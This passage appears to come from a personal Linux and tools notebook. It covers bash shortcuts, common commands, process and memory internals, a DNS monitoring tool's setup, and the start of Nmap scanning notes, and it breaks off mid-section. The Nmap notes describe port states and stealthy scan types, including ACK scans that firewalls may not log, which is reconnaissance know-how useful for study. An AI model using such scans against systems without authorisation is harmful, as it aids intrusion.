  Ctrl + n   Next command in history (i.e. walk forward through the command history).

  Ctrl + s   Go back to the next most recent command.
             (beware to not execute it from a terminal because this will also launch its XOFF).
  Ctrl + o   Execute the command found via Ctrl+r or Ctrl+s
  Ctrl + g   Escape from history searching mode
        !!   Repeat last command
       !n    Repeat from the last command: args n e.g. !:2 for the second argumant.
       !n:m  Repeat from the last command: args from n to m. e.g. !:2-3 for the second and third.
       !n:$  Repeat from the last command: args n to the last argument.
       !n:p  Print last command starting with n
     !string Print the last command beginning with string.
       !:q   Quote the last command with proper Bash escaping applied.
              Tip: enter a line of Bash starting with a # comment, then run !:q on the next line to escape it.
        !$   Last argument of previous command.
   ALT + .   Last argument of previous command.
        !*   All arguments of previous command.
^abc¬≠^¬≠def   Run previous command, replacing abc with def
</code></pre>
<h2 id="process-control"><a class="header" href="#process-control">Process control:</a></h2>
<pre><code> Ctrl + C   Interrupt/Kill whatever you are running (SIGINT).
 Ctrl + l   Clear the screen.
 Ctrl + s   Stop output to the screen (for long running verbose commands).
            Then use PgUp/PgDn for navigation.
 Ctrl + q   Allow output to the screen (if previously stopped using command above).
 Ctrl + D   Send an EOF marker, unless disabled by an option, this will close the current shell (EXIT).
 Ctrl + Z   Send the signal SIGTSTP to the current task, which suspends it.
            To return to it later enter fg 'process name' (foreground).
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="commands-3"><a class="header" href="#commands-3">Commands</a></h1>
<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">jobcontrol</a></li>
<li><a href="#kill">kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chgrp"><a class="header" href="#chgrp">chgrp</a></h1>
<p><code>chgrp</code> can be used to change the owning group of a file or directory</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chmod"><a class="header" href="#chmod">Chmod</a></h1>
<p>Chmod is used to manage permissions (mode) on a file or directory</p>
<p>The syntax of the chmod command when using the symbolic mode has the following format:</p>
<pre><code>chmod [OPTIONS] NUMBER FILE...
</code></pre>
<p>When using the numeric mode, you can set the permissions for all three user classes (owner, group, and all others) at the same time.</p>
<p>The permission number can be a 3 or 4-digits number. When 3 digits number is used, the first digit represents the permissions of the file‚Äôs owner, the second one the file‚Äôs group, and the last one all other users.</p>
<p>Each write, read, and execute permissions have the following number value:</p>
<ul>
<li>r (read) = 4</li>
<li>w (write) = 2</li>
<li>x (execute) = 1</li>
<li>no permissions = 0</li>
</ul>
<p>The permissions number of a specific user class is represented by the sum of the values of the permissions for that group.</p>
<p>To find out the file‚Äôs permissions in numeric mode, simply calculate the totals for all users‚Äô classes. For example, to give read, write and execute permission to the file‚Äôs owner, read and execute permissions to the file‚Äôs group and only read permissions to all other users, you would do the following:</p>
<ul>
<li>Owner: rwx=4+2+1=7</li>
<li>Group: r-x=4+0+1=5</li>
<li>Others: r-x=4+0+0=4</li>
</ul>
<p>Using the method above, we come up to the number 754, which represents the desired permissions.</p>
<p>When the 4 digits number is used, the first digit has the following meaning:</p>
<ul>
<li>setuid=4</li>
<li>setgid=2</li>
<li>sticky=1</li>
<li>no changes = 0</li>
</ul>
<p>The next three digits have the same meaning as when using 3 digits number.</p>
<p>If the first digit is 0 it can be omitted, and the mode can be represented with 3 digits. The numeric mode 0755 is the same as 755.</p>
<p>To calculate the numeric mode, you can also use another method (binary method), but it is a little more complicated. Knowing how to calculate the numeric mode using 4, 2, and 1 is sufficient for most users.</p>
<p>You can check the file‚Äôs permissions in the numeric notation using the stat command:</p>
<p><code>stat -c "%a" file_name</code></p>
<h4 id="here-are-some-examples-of-how-to-use-the-chmod-command-in-numeric-mode"><a class="header" href="#here-are-some-examples-of-how-to-use-the-chmod-command-in-numeric-mode">Here are some examples of how to use the chmod command in numeric mode:</a></h4>
<ul>
<li>Give the file‚Äôs owner read and write permissions and only read permissions to group members and all other users:</li>
</ul>
<p><code>chmod 644 dirname</code></p>
<ul>
<li>Give the file‚Äôs owner read, write and execute permissions, read and execute permissions to group members and no permissions to all other users:</li>
</ul>
<p><code>chmod 750 dirname</code></p>
<ul>
<li>Give read, write, and execute permissions, and a sticky bit to a given directory:</li>
</ul>
<p><code>chmod 1777 dirname</code></p>
<ul>
<li>Recursively set read, write, and execute permissions to the file owner and no permissions for all other users on a given directory:</li>
</ul>
<p><code>chmod -R 700 dirname</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="chown"><a class="header" href="#chown">chown</a></h1>
<p><code>chown</code> can be used to change the owning user</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dd"><a class="header" href="#dd">dd</a></h1>
<ul>
<li>dd is useful when working with block and character devices</li>
<li>dd‚Äôs sole purpose is to read from an input file or stream and write to an output file or stream</li>
<li>dd copies data in blocks of a fixed size</li>
</ul>
<h4 id="example-usage-1"><a class="header" href="#example-usage-1">example usage</a></h4>
<pre><code class="language-sh">dd if=/dev/zero of=new_file bs=1024 count=1
</code></pre>
<p>the <code>dd</code> command syntax differs from most other unix style commands. It is based on an old IBM job control language (JCL) style.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="groups-2"><a class="header" href="#groups-2">groups</a></h1>
<p><code>groups</code> can be used to view what group memberships a user has</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ip"><a class="header" href="#ip">ip</a></h1>
<p>Show IP stack Info</p>
<h4 id="example-5"><a class="header" href="#example-5">Example</a></h4>
<pre><code>$ ip addr
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
      valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
      valid_lft forever preferred_lft forever
2: eth0:  mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:22:48:27:87:eb brd ff:ff:ff:ff:ff:ff
    inet 172.16.1.4/24 brd 172.16.1.255 scope global noprefixroute eth0
      valid_lft forever preferred_lft forever
    inet6 fe80::222:48ff:fe27:87eb/64 scope link
      valid_lft forever preferred_lft forever
3: enP12806s1:  mtu 1500 qdisc mq master eth0 state UP group default qlen 1000
    link/ether 00:22:48:27:87:eb brd ff:ff:ff:ff:ff:ff
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="job-control"><a class="header" href="#job-control">Job Control</a></h1>
<p>Normally, when you start a command in a shell, you don‚Äôt get the shell prompt back until the program finishes executing. You can detach a process from the shell using the ampersand (&amp;), which will send it to the background.</p>
<p>You can use <code>jobs</code> to view currently running background jobs.
You can use <code>fg &lt;pid&gt;</code> to bring a background process back to the foreground.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kill"><a class="header" href="#kill">Kill</a></h1>
<h2 id="kill-can-be-used-to-kill-a-process"><a class="header" href="#kill-can-be-used-to-kill-a-process">kill can be used to kill a process</a></h2>
<h4 id="usageoutput"><a class="header" href="#usageoutput">Usage/Output</a></h4>
<pre><code>$ kill 22541
[1]+  Terminated              sleep 60
</code></pre>
<h4 id="commonly-used-options"><a class="header" href="#commonly-used-options">Commonly Used Options</a></h4>
<ul>
<li>Kill can be used without any options. However, you can also specify what signal to use:</li>
</ul>
<pre><code>$ kill -l
 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX
</code></pre>
<pre><code>$ sleep 60 &amp;
[1] 22661
$ kill -s 9 22661
[1]+  Killed                  sleep 60

</code></pre>
<ul>
<li>If you do not specify a signal, SIGTERM (15) is used</li>
<li>You can stop a process (it will still reside in memory) with signal 19, and resume it with signal 18</li>
<li>All signals except for SIGKILL (9) can be ignored. SIGKILL does not give a process the change to clean up after itself or finish work. The kernel immediately terminates the process and forcibly removes it from memory.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lsscsi"><a class="header" href="#lsscsi">lsscsi</a></h1>
<ul>
<li>can be used to walk the SCSI device paths provided by <code>sysfs</code></li>
<li>not installed on most systems by default</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="passwd"><a class="header" href="#passwd">passwd</a></h1>
<p>Can be used to manipulate user passwords</p>
<p>Example:
<code>passwd ryan</code></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ps"><a class="header" href="#ps">ps</a></h1>
<h2 id="ps-is-used-for-viewing-process-status"><a class="header" href="#ps-is-used-for-viewing-process-status">ps is used for viewing process status</a></h2>
<h4 id="usageoutput-1"><a class="header" href="#usageoutput-1">Usage/Output</a></h4>
<pre><code>$ ps
PID        TTY     STAT   TIME          CMD
5140     pts/4    Ss        00:00:00     bash
61244    pts/4    R+        00:00:00     ps
</code></pre>
<ul>
<li>PID = the process Id</li>
<li>TTY = the terminal device where the process is running</li>
<li>STAT = the current status of the process. It can be ‚Äòs‚Äô for sleeping, ‚Äòr‚Äô for running. See the man page ps(1) for more info</li>
<li>TIME = the CPU time that the process has used. Note that this is different than the ‚Äòwall-clock‚Äô time</li>
<li>CMD = the command used to start the process</li>
</ul>
<h4 id="commonly-used-options-1"><a class="header" href="#commonly-used-options-1">Commonly Used Options</a></h4>
<p>There are many options available to the <code>ps</code> command. To make things more confusing, you can specify options in 3 different styles - Unix, BSD, and GNU. Most people use the BSD style, as it is seemingly most comfortable to use (less typing).</p>
<p>Here are some of the most commonly used BSD-style options:</p>
<ul>
<li><code>ps x</code> = show all of your running processes</li>
<li><code>ps ax</code> = show all processes on the system, not just those that you own</li>
<li><code>ps u</code> = Include more detailed information on processes</li>
<li><code>ps w</code> = show full command names, not just what fits on a single line</li>
<li><code>ps u $$</code> = status of the current process</li>
<li><code>ps aux</code> = show all processes for all users with verbose detail</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="umask"><a class="header" href="#umask">umask</a></h1>
<p>See page 37</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
<ul>
<li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
<li><a href="#memory-management-1">memory_management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">process_execution_and_scheduling</a></li>
<li><a href="#process-structure-and-ipc">process_structure_and_ipc</a></li>
<li><a href="#startup-and-init">startup_and_init</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="block-devices-and-file-systems"><a class="header" href="#block-devices-and-file-systems">Block Devices and File Systems</a></h1>
<h2 id="device-special-files"><a class="header" href="#device-special-files">Device Special Files</a></h2>
<ul>
<li>In Linux, everything is a File</li>
<li><code>/dev</code> contains device files</li>
<li><code>mknod</code> can be used to make a device file
<ul>
<li>Example: <code>mknod mydevice b 1 1</code></li>
</ul>
</li>
<li><code>udev</code> manages devices, it creates the device files in the <code>/dev</code> directory</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="memory-management-1"><a class="header" href="#memory-management-1">Memory Management</a></h1>
<ul>
<li><code>pmap &lt;pid&gt;</code>
<ul>
<li>any line showing ‚Äòanon‚Äô memory is the heap</li>
</ul>
</li>
<li>page tables are supported directly by the CPU and memory management unit (MMU)</li>
<li>The page table turns logical memory addresses into real RAM addresses</li>
<li>The kernel allocates pages</li>
<li>Pages are allocated and mapped when a program is loaded at run time</li>
<li>When a program needs more memory, allocate from the heap</li>
<li>Processes that need a shared library will all reference the same pages for that shared object in memory</li>
<li>If you don‚Äôt have enough memory available, pages are swapped out to disk
<ul>
<li>Create swap space with <code>mkswap</code></li>
<li>Start with <code>swapon</code></li>
<li>Any partition with type 82 will be allocated as swap type at boot</li>
</ul>
</li>
<li><code>/proc/&lt;pid&gt;/smaps</code>
<ul>
<li>Detailed information about paging for a process</li>
</ul>
</li>
<li>‚Äò/proc/meminfo‚Äô</li>
<li>RSS: Resident set size
<ul>
<li>How much virtual memory is in real memory</li>
</ul>
</li>
<li>Thrashing</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="execution-and-scheduling-of-processes-and-threads"><a class="header" href="#execution-and-scheduling-of-processes-and-threads">Execution and Scheduling of Processes and Threads</a></h1>
<h2 id="how-are-processes-made"><a class="header" href="#how-are-processes-made">How are processes made?</a></h2>
<ul>
<li>Processes are created with <code>fork()</code></li>
<li>The new process created with <code>fork()</code> is an exact copy of its parent
<ul>
<li>Everything is copied from the parent except for file locks and any pending signals</li>
<li>the <code>fork()</code> system call has a return value of &gt; 0 if you‚Äôre the parent, if you‚Äôre the child the value will be 0. If there is an error the return value will be less than 0.</li>
<li><code>fork()</code> doesn‚Äôt copy all memory to the child at first. The child process shares the memory of the parent until the child or parent needs to write to the memory. Then the process that needs to modify the memory makes a copy of just that page and makes it‚Äôs change. This is called Copy On Write (COW).</li>
<li>On Linux, c libraries typically implement fork() by wrapping clone()</li>
</ul>
</li>
</ul>
<h2 id="daemons"><a class="header" href="#daemons">Daemon‚Äôs</a></h2>
<ul>
<li>Services / background processes</li>
<li>How to make a daemon:
<ul>
<li>Fork the parent process, then the parent exits, leaving the child process with parent init (pid=1)</li>
<li>Close all open file‚Äôs</li>
<li>Become the process group leader
<ul>
<li>a Process Group</li>
</ul>
</li>
<li>Set the umask</li>
<li>Change dir to a safe place</li>
<li>Possibly ignore some signals</li>
</ul>
</li>
</ul>
<h2 id="process-scheduling"><a class="header" href="#process-scheduling">Process Scheduling</a></h2>
<ul>
<li>Priority determines which process gets to run</li>
<li>The kernel constantly has to decide which process to run next</li>
<li>Context switching involves moving register values out of the CPU and into memory, and loading registers for the next process to run</li>
<li>Every process has a task state associated with it. The states are:
<ul>
<li>TASK_RUNNING
<ul>
<li>Processes in the running state have a time quantum to run within. By default, 100ms.</li>
<li>The kernel checks the process time quantum every tick.</li>
</ul>
</li>
<li>TASK_INTERRUPTABLE</li>
<li>TASK_UNINTERRUPTABLE
<ul>
<li>This is rare</li>
</ul>
</li>
<li>TASK_STOPPED</li>
<li>TASK_TRACED
<ul>
<li>Example: tracing the process with <code>strace</code></li>
</ul>
</li>
<li>EXIT_ZOMBIE</li>
<li>EXIT_DEAD</li>
</ul>
</li>
</ul>
<h2 id="threads-1"><a class="header" href="#threads-1">Threads</a></h2>
<ul>
<li>a thread is a lightweight process</li>
<li>Threads of a process all run in the same memory address space
<ul>
<li>A thread has its own instruction pointer</li>
<li>The stack is not shared. Each has its own stack.</li>
<li>In linux all threads have their own PID</li>
<li>Threads will spin (spin-lock) if they are waiting to access memory that is locked by another thread
<ul>
<li>Processes that are spinning do not go to sleep or cede back to the kernel</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="process-structure-and-ipc"><a class="header" href="#process-structure-and-ipc">Process Structure and IPC</a></h1>
<h2 id="what-is-a-process"><a class="header" href="#what-is-a-process">What is a process?</a></h2>
<ul>
<li>A running program</li>
<li>Executable binary (ELF File)</li>
<li>A set of data structures in the kernel
<ul>
<li>This is the process itself</li>
<li>Helps the kernel keep track of resources used by the process (open files, mmap, etc.)</li>
</ul>
</li>
<li>Unit to which the kernel allocates resources</li>
<li>Parts of a process:
<ul>
<li>PID</li>
<li>PPID</li>
<li>Open files
<ul>
<li>Array of file descriptors in task struct (0 is stdin, 1 is stdout, 2 is stderr, and so on‚Ä¶)</li>
</ul>
</li>
<li>TTY (pseudo tty nowadays)</li>
<li>UID (a signed integer)
<ul>
<li>a process can change its UID by using setuid</li>
</ul>
</li>
<li>GUID (a signed integer)</li>
<li>Priority (can be set with nice value (renice for already running processes))</li>
<li>limits (rlimit)</li>
<li>timestamps / counters</li>
</ul>
</li>
<li>processes are defined as task_struct in sched.h of the source</li>
<li>What can you do with a process?
<ul>
<li>Create</li>
<li>Send a signal (kill)</li>
<li>Get information about (ps, pidof, etc.)</li>
</ul>
</li>
</ul>
<h2 id="process-memory"><a class="header" href="#process-memory">Process memory</a></h2>
<ul>
<li>Heap grows up</li>
<li>Stack grows down</li>
<li>Data section for initialized variables and data</li>
<li><code>malloc</code> to allocate memory on the heap</li>
<li><code>free</code> to free memory from the heap</li>
<li>You can see the mmap of a running process using <code>pmap &lt;pid&gt;</code></li>
</ul>
<h2 id="resource-limits"><a class="header" href="#resource-limits">Resource Limit‚Äôs</a></h2>
<ul>
<li>rlimits or ulimits (shell)</li>
<li><code>getrlimit()</code> or <code>setrlimit()</code></li>
<li><code>ulimit -a</code> to view limits</li>
<li>Use to control users, processes</li>
<li>Usage is not common these days</li>
<li>Default limits exist</li>
<li>stored in <code>/etc/security/limits.conf</code></li>
</ul>
<h2 id="process-priority"><a class="header" href="#process-priority">Process Priority</a></h2>
<ul>
<li>Set nice value with <code>nice</code> command</li>
<li>nice() system call</li>
<li>a regular user can only increase the nice value (decreasing its priority)</li>
<li>in all cases, higher number means lower priority</li>
<li><code>top</code> and <code>ps -eo</code> can be used to view the nice value</li>
<li>Default value for nice is 0</li>
</ul>
<h1 id="ipc"><a class="header" href="#ipc">IPC</a></h1>
<ul>
<li>How processes talk to each other</li>
<li>Also available but used left often, FIFO, semaphores, shared memory</li>
<li>Sockets, pipes, signals</li>
<li>Pipes exist entirely in memory, no files or disk IO are involved</li>
<li>Pipes can only exist between members of the same family in the process tree</li>
<li>If you want a pipe between processes that are not in the same process family tree, you can use FIFO, which are a file on the disk <code>mkfifo</code></li>
<li>View all signals with the <code>kill</code> command</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="startup-and-init"><a class="header" href="#startup-and-init">Startup and Init</a></h1>
<ul>
<li>Bootstrapping
<ul>
<li>First thing that happens when you power on a system is a positive voltage (5v) is applied to the reset pin of the CPU</li>
<li>Two registers are initialized:
<ul>
<li>CS Register: Has the address of the stack</li>
<li>EIP Register: The current instruction to execute</li>
</ul>
</li>
<li>Load the BIOS from ROM
<ul>
<li>Linux doesn‚Äôt use the BIOS after boot, it only uses device drivers loaded by the kernel</li>
<li>MSDOS used the BIOS to execute system calls</li>
<li>BIOS Steps:
<ol>
<li>POST (Power on self test)</li>
<li>ACPI - builds tables of devices with information regrading power. Can be used to decide when a system can power down a device or set it to a lower power level</li>
<li>Hardware Initialisation</li>
</ol>
<ul>
<li>3 ways to communicate with devices on a PC:
<ol>
<li>IO port from CPU to the device for communication via a port address</li>
<li>Map memory from the device to the address space of the computer and read/write to it</li>
<li>Use interrupts</li>
</ol>
</li>
</ul>
<ol start="4">
<li>Find a boot device by searching for a boot sector on each device.</li>
</ol>
<ul>
<li>First sector of a disk is the master boot record with contains the partition table and a boot loader (GRUB)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-kernel-development"><a class="header" href="#linux-kernel-development">Linux Kernel Development</a></h1>
<ul>
<li><a href="#building-the-linux-kernel">Building the Linux Kernel</a></li>
<li><a href="#kernel-modules">Kernel Modules</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="building-the-linux-kernel"><a class="header" href="#building-the-linux-kernel">Building the Linux Kernel</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kernel-modules"><a class="header" href="#kernel-modules">Kernel Modules</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
<ul>
<li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
<li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
<li><a href="#hydra">hydra</a></li>
<li><a href="#nmap-1">nmap</a></li>
<li><a href="#medusa">medusa</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="need-to-addrefine"><a class="header" href="#need-to-addrefine">Need to add/refine:</a></h1>
<ul>
<li>
<p>Build for multiple platforms</p>
</li>
<li>
<p>Support consumption by other programs via stdout/stderr</p>
</li>
<li>
<p>rename directory structure</p>
<ul>
<li>Example: in getheaders, ./cmd/getHeaders should be ./cmd/cli</li>
</ul>
</li>
<li>
<p>finish
[ ] httpedia
[ ] httpbench
[ ] crayola
[ ] goal?
[ ] dnscache
[ ] podcrashcollector
[ ] dnsfixer
[ ] taint-remover
[ ] httpstat</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="instructions-for-using-dnspinger"><a class="header" href="#instructions-for-using-dnspinger">instructions for using dnspinger</a></h1>
<p><em>Before deploying dnsPinger, you will want to create an App Insights workspace.</em></p>
<p>In this package, you will find a file named env.vars. This file contains a list of environment variables that will be passed to the container:</p>
<pre><code class="language-s">DNSPINGER_CUSTOM_DIMENSIONS=NodePool=mylaptop;env=local
DNSPINGER_DOMAINS=www.google.com;homedepot.aprimo.com;api.videoindexer.ai
DNSPINGER_REGION=us1
DNSPINGER_RESOLVERS=google=8.8.8.8;opendns=208.67.222.222;azure=168.63.129.16
APPINSIGHTS_INSTRUMENTATIONKEY=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
</code></pre>
<p>The following section will explain these environment variables and their usage:</p>
<ul>
<li>DNSPINGER_CUSTOM_DIMENSIONS: A list of semi-colon (;) delimited key-value pairs. In addition to the other environment variables, these are passed to the Log Analytics <code>customEvents</code> table as customDimensions. The idea here was to include the name of the nodepool where this application is running and any other pertinent information.</li>
<li>DNSPINGER_DOMAINS: A semi-colon (;) delimited list of domains to resolve.</li>
<li>DNSPINGER_REGION: The region where the application is running. We implemented this because (as stated on our call), we are running AKS in 3 regions (Australia East, East US, and West Europe)</li>
<li>DNSPINGER_RESOLVERS: A list of semi-colon (;) delimited key-value pairs. The key is the name of a resolver (this is just an arbitrary string used for identification) and the value is the IP address of the resolver</li>
<li>APPINSIGHTS_INSTRUMENTATIONKEY: The App Insights instrumentation key where the logs can be uploaded to</li>
</ul>
<p>You can also view logs by tailing the pod:</p>
<pre><code>Found domain to resolve: www.google.com
[google]        Resolving www.google.com: 142.250.190.36
[opendns]       Resolving www.google.com: 142.250.191.196
[DotnetResolver]        Resolving www.google.com: 172.253.62.103,172.253.62.147,172.253.62.99,172.253.62.104,172.253.62.105,172.253.62.106
[DefaultResolver]       Resolving www.google.com: 172.253.62.103,172.253.62.147,172.253.62.99,172.253.62.104,172.253.62.105,172.253.62.106
Found domain to resolve: homedepot.aprimo.com
[google]        Resolving homedepot.aprimo.com: 52.255.216.147
[opendns]       Resolving homedepot.aprimo.com: 52.255.216.147
[DotnetResolver]        Resolving homedepot.aprimo.com: 52.255.216.147
[DefaultResolver]       Resolving homedepot.aprimo.com: 52.255.216.147
Found domain to resolve: api.videoindexer.ai
[google]        Resolving api.videoindexer.ai: 52.162.125.85
[opendns]       Resolving api.videoindexer.ai: 52.162.125.85
[DotnetResolver]        Resolving api.videoindexer.ai: 168.62.50.75
[DefaultResolver]       Resolving api.videoindexer.ai: 168.62.50.75
Found domain to resolve: www.microsoft.com
[google]        Resolving www.microsoft.com: 184.84.226.4
[opendns]       Resolving www.microsoft.com: 23.78.9.173
[DotnetResolver]        Resolving www.microsoft.com: 104.72.157.175
[DefaultResolver]       Resolving www.microsoft.com: 104.72.157.175
[MessagesSent]  0
[MessagesReceived]      0
[ErrorsSent]    0
[ErrorsReceived]        0
[EchoRequestsSent]      0
[EchoRequestsReceived]  0
[EchoRepliesSent]       0
[EchoRepliesReceived]   0
[DestinationUnreachableMessagesSent]    0
[DestinationUnreachableMessagesReceived]        0
[SourceQuenchesSent]    0
[SourceQuenchesReceived]        0
[RedirectsSent] 0
[RedirectsReceived]     0
[TimeExceededMessagesSent]      0
[TimeExceededMessagesReceived]  0
[ParameterProblemsSent] 0
[ParameterProblemsReceived]     0
[TimestampRequestsSent] 0
[TimestampRequestsReceived]     0
[TimestampRepliesSent]  0
[TimestampRepliesReceived]      0
[AddressMaskRequestsSent]       0
[AddressMaskRequestsReceived]   0
[AddressMaskRepliesSent]        0
[AddressMaskRepliesReceived]    0
</code></pre>
<p>You will also see some network statistics in the logs.</p>
<p>To run locally:
<code>docker run --env-file ./env.vars rnemethaprimo/dnspinger@latest</code></p>
<p>To run in Kubernetes:
Use the attached deployment.yaml (be sure to update the env vars accordingly)</p>
<h2 id="some-simple-la-queries-to-get-you-started"><a class="header" href="#some-simple-la-queries-to-get-you-started">Some simple LA queries to get you started:</a></h2>
<pre><code># get all failed queries in the last 10 minutes:

let t = 10m;
customEvents
| where timestamp &gt; ago(t)
| where customDimensions.Success == false

# get log entries for a resolver
customEvents
| where customDimensions.Resolver == "azure"

</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h1>
<p>Understanding how Nmap works is critical for interpreting scan results. After confirming a host is alive, scanning helps identify:</p>
<ul>
<li>Open ports &amp; services</li>
<li>Service versions</li>
<li>Service information</li>
<li>Operating system details</li>
</ul>
<h2 id="port-states-6-total"><a class="header" href="#port-states-6-total">Port States (6 Total)</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>State</th><th>Meaning</th></tr>
</thead>
<tbody>
<tr><td><strong>open</strong></td><td>Target accepts connections (TCP/UDP/SCTP).</td></tr>
<tr><td><strong>closed</strong></td><td>Replies with <strong>RST</strong>; port reachable but no service.</td></tr>
<tr><td><strong>filtered</strong></td><td>No response or error; filtering prevents state determination.</td></tr>
<tr><td><strong>unfiltered</strong></td><td>Only in ACK scans; port reachable, state unknown.</td></tr>
<tr><td><strong>open|filtered</strong></td><td>No response; likely filtered or silently dropped.</td></tr>
<tr><td><strong>closed|filtered</strong></td><td>Only in idle scans; cannot determine closed vs filtered.</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="tcp-scanning"><a class="header" href="#tcp-scanning">TCP Scanning</a></h1>
<h2 id="ack-scan--sa"><a class="header" href="#ack-scan--sa">ACK Scan (-sA)</a></h2>
<ul>
<li>Difficult for firewalls to detect.</li>
<li>TCP packet only has the ACK flag set, forcing a RST response from unfiltered ports.</li>
<li>Packets with the ACK flag set are usually used to acknowledge received data, so firewalls may not log them as suspicious or block them.</li>
</ul>
<h2 id="syn-scan--ss"><a class="header" href="#syn-scan--ss">SYN Scan (-sS)</a></h2>
<ul>
<li>Default when running as root.</li>
<li>Fast &amp; stealthy (half‚Äëopen).</li>
<li>Interprets SYN‚ÄëACK -&gt; open, RST -&gt; closed.</li>
</ul>
<h3 id="port-selection-examples"><a class="header" href="#port-selection-examples">Port selection examples</a></h3>
<ul>
<li><code>-p 22,80,445</code></li>
<li><code>-p 22-445</code></li>
<li><code>--top-ports=10</code></li>
<li><code>-p-</code></li>
<li><code>-F</code> (top 100)</li>
</ul>
<hr>
<h2 id="packet-tracing-packet-trace"><a class="header" href="#packet-tracing-packet-trace">Packet Tracing (‚Äìpacket-trace)</a></h2>
<p>Shows packets sent/received.<br>Example for closed port:</p>
<ul>
<li>SENT: SYN</li>
<li>RCVD: RST/ACK -&gt; closed</li>
</ul>
<hr>
<h1 id="tcp-connect-scan--st"><a class="header" href="#tcp-connect-scan--st">TCP Connect Scan (-sT)</a></h1>
<ul>
<li>Used when not root.</li>
<li>Completes full handshake.</li>
<li><strong>Most accurate, least stealthy</strong>.</li>
<li>Logged by services/IDS.</li>
<li>Useful when outbound connections allowed but inbound blocked.</li>
</ul>
<hr>
<h1 id="filtered-ports"><a class="header" href="#filtered-ports">Filtered Ports</a></h1>
<h3 id="dropped-packets"><a class="header" href="#dropped-packets">Dropped packets:</a></h3>
<ul>
<li>No reply -&gt; Nmap retries (default 10).</li>
<li>Slow scan.</li>
</ul>
<h3 id="rejected-packets"><a class="header" href="#rejected-packets">Rejected packets:</a></h3>
<ul>
<li>ICMP type 3 code 3 -&gt; port unreachable -&gt; likely firewall rejection.</li>
</ul>
<hr>
<h1 id="udp-scanning--su"><a class="header" href="#udp-scanning--su">UDP Scanning (-sU)</a></h1>
<ul>
<li>Slow due to long timeouts.</li>
<li>Many ports show <strong>open|filtered</strong> due to lack of responses.</li>
<li>Determining states:
